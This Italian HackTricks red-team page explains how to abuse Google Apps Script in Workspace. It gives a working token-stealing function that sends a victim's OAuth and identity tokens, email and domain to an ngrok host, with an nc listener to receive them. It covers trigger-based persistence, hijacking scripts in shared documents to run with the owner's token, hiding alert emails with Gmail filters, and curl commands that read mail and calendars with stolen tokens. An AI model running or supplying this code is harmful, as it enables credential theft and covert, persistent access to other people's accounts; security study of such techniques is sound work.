# GWS - App Scripts

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## App Scripts

App Scripts √® **codice che verr√† attivato quando un utente con permessi di editor accede al documento a cui √® collegato lo script dell'app** e dopo **aver accettato la richiesta OAuth**.\
Possono anche essere impostati per essere **eseguiti a intervalli regolari** dal proprietario dello script dell'app (Persistenza).

### Creare uno script dell'app

Ci sono diversi modi per creare uno script dell'app, anche se i pi√π comuni sono **da un documento Google (di qualsiasi tipo)** e come **progetto autonomo**:

<details>

<summary>Crea un progetto legato al contenitore da Documenti, Fogli o Presentazioni di Google</summary>

1. Apri un documento di Documenti, un foglio di calcolo di Fogli o una presentazione di Presentazioni.
2. Fai clic su **Estensioni** > **Script delle app di Google**.
3. Nell'editor di script, fai clic su **Progetto senza titolo**.
4. Dai un nome al tuo progetto e fai clic su **Rinomina**.

</details>

<details>

<summary>Crea un progetto autonomo</summary>

Per creare un progetto autonomo da Apps Script:

1. Vai a [`script.google.com`](https://script.google.com/).
2. Fai clic su **Nuovo progetto**.
3. Nell'editor di script, fai clic su **Progetto senza titolo**.
4. Dai un nome al tuo progetto e fai clic su **Rinomina**.

</details>

<details>

<summary>Crea un progetto autonomo da Google Drive</summary>

1. Apri [Google Drive](https://drive.google.com/).
2. Fai clic su **Nuovo** > **Altro** > **Script delle app di Google**.

</details>

<details>

<summary>Crea un progetto legato al contenitore da Moduli di Google</summary>

1. Apri un modulo in Moduli di Google.
2. Fai clic su Altro more\_vert > **Editor di script**.
3. Nell'editor di script, fai clic su **Progetto senza titolo**.
4. Dai un nome al tuo progetto e fai clic su **Rinomina**.

</details>

<details>

<summary>Crea un progetto autonomo utilizzando lo strumento da riga di comando clasp</summary>

`clasp` √® uno strumento da riga di comando che consente di creare, estrarre/spingere e distribuire progetti di Apps Script da un terminale.

Consulta la [Guida all'interfaccia della riga di comando utilizzando `clasp`](https://developers.google.com/apps-script/guides/clasp) per ulteriori dettagli.

</details>

## Scenario dello script dell'app <a href="#create-using-clasp" id="create-using-clasp"></a>

### Creare un foglio di Google con uno script dell'app

Inizia creando uno script dell'app, la mia raccomandazione per questo scenario √® creare un foglio di Google e andare su **`Estensioni > Script delle app`**, questo aprir√† uno **nuovo script dell'app collegato al foglio**.

### Leak del token

Per dare accesso al token OAuth √® necessario fare clic su **`Servizi +` e aggiungere ambiti come**:

* **AdminDirectory**: Accesso agli utenti e ai gruppi della directory (se l'utente ha sufficienti autorizzazioni)
* **Gmail**: Per accedere ai dati di Gmail
* **Drive**: Per accedere ai dati di Drive
* **API di Google Sheets**: Per farlo funzionare con il trigger

Per modificare personalmente gli **ambiti necessari**, √® possibile andare alle impostazioni del progetto e **abilitare "Mostra il file di manifesto appsscript.json nell'editor".**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Per catturare la richiesta, √® sufficiente eseguire:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Autorizzazioni richieste per eseguire lo script dell'app:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Poich√© viene effettuata una richiesta esterna, la finestra di dialogo di OAuth chieder√† anche **il permesso di raggiungere endpoint esterni**.
{% endhint %}

### Creare un trigger

Una volta che l'app √® stata letta, fare clic su **‚è∞ Triggers** per creare un trigger. Come **funzione** da eseguire, scegliere **`getToken`**, eseguito al momento del rilascio **`Head`**, selezionare **`From spreadsheet`** come origine dell'evento e selezionare **`On open`** o **`On edit`** come tipo di evento (a seconda delle necessit√†) e salvare.

Si noti che √® possibile controllare le **esecuzioni degli script dell'app nella scheda Esecuzioni** se si desidera eseguire il debug di qualcosa.

### Condivisione

Per **attivare** lo **script dell'app**, la vittima deve connettersi con **Accesso editor**.

In sintesi, se il creatore e l'utente invitato sono **della stessa organizzazione**, il **token OAuth** apparterr√† all'**utente** che accede al file.\
Se sono di **organizzazioni diverse**, il **token** apparterr√† al **creatore del trigger**, sempre con **solo le autorizzazioni OAuth fornite** al momento della creazione del trigger.

{% hint style="success" %}
Il **token** utilizzato per eseguire lo **script dell'app** sar√† quello del **creatore del trigger**, anche se il file viene aperto come Editor da altri utenti.
{% endhint %}

### Abuso dei documenti condivisi con me

{% hint style="danger" %}
Se qualcuno **condivide con te un documento con script dell'app e un trigger che utilizza l'Head** dello script dell'app (non un rilascio fisso), puoi modificare il codice dello script dell'app (aggiungendo ad esempio le funzioni di furto del token), accedervi e lo **script dell'app verr√† eseguito con le autorizzazioni dell'utente che ha condiviso il documento con te**! (si noti che il token OAuth del proprietario avr√† come ambiti di accesso quelli forniti al momento della creazione del trigger).

Verr√† inviata una **notifica al creatore dello script** che indica che qualcuno ha modificato lo script (cosa ne dici di utilizzare le autorizzazioni di Gmail per generare un filtro per impedire l'allerta?)
{% endhint %}

{% hint style="success" %}
Se un **attaccante modifica gli ambiti dello script dell'app**, gli aggiornamenti **non verranno applicati** al documento fino a quando non viene creato un **nuovo trigger** con le modifiche. Pertanto, un attaccante non sar√† in grado di rubare il token del creatore con pi√π ambiti di quelli impostati nel trigger che ha creato.
{% endhint %}

### Copiare invece di condividere

Quando si crea un link per condividere un documento, viene creato un link simile a questo: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Se si **cambia** la parte finale **"/edit"** in **"/copy"**, invece di accedervi, Google chieder√† se si desidera **generare una copia del documento**:

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Se l'utente lo copia e vi accede, sia **il contenuto del documento che gli script dell'app verranno copiati**, tuttavia i **trigger no**, quindi **nulla verr√† eseguito**.

### Condivisione come applicazione Web

Si noti che √® anche possibile **condividere uno script dell'app come applicazione Web** (nell'Editor dello script dell'app, distribuirlo come applicazione Web), ma apparir√† un avviso come questo:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Seguito dalla **tipica finestra di dialogo di OAuth** che richiede le autorizzazioni necessarie.

### Testing

√à possibile testare un token raccolto per elencare le email con:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Elenco calendario dell'utente:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script come Persistenza

Una opzione per la persistenza sarebbe **creare un documento e aggiungere un trigger per la funzione getToken** e condividere il documento con l'attaccante in modo che ogni volta che l'attaccante apre il file **esfiltrer√† il token della vittima**.

√à anche possibile creare uno script dell'app e impostarlo in modo che venga attivato ogni X tempo (come ogni minuto, ora, giorno...). Un attaccante che ha **compromesso le credenziali o una sessione di una vittima potrebbe impostare uno script dell'app con un trigger temporale e divulgare un token OAuth molto privilegiato ogni giorno**:

Basta creare uno script dell'app, andare su Trigger, fare clic su Aggiungi trigger e selezionare come origine dell'evento Time-driven e selezionare le opzioni che meglio si adattano a te:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Questo creer√† una email di allerta di sicurezza e un messaggio push sul tuo dispositivo mobile per avvisarti di ci√≤.
{% endhint %}



### Bypass della richiesta non verificata di un documento condiviso

Inoltre, se qualcuno **condivide** con te un documento con **accesso come editor**, puoi generare **script dell'app all'interno del documento** e il **PROPRIETARIO (creatore) del documento sar√† il proprietario dello script dell'app**.

{% hint style="warning" %}
Ci√≤ significa che il **creatore del documento apparir√† come creatore di qualsiasi script dell'app** che chiunque con accesso come editor crea al suo interno.

Ci√≤ significa anche che lo **script dell'app sar√† considerato attendibile dall'ambiente Workspace** del creatore del documento.
{% endhint %}

{% hint style="danger" %}
Ci√≤ significa anche che se uno **script dell'app esisteva gi√†** e le persone hanno **concesso l'accesso**, chiunque con **permesso di editor** sul documento pu√≤ **modificarlo e abusare di tale accesso**.\
Per sfruttare ci√≤, √® necessario anche che le persone attivino lo script dell'app. E un trucco interessante √® **pubblicare lo script come web app**. Quando le **persone** che hanno gi√† **concesso l'accesso** allo script dell'app accedono alla pagina web, attiveranno lo **script dell'app** (questo funziona anche utilizzando tag `<img>`).
{% endhint %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
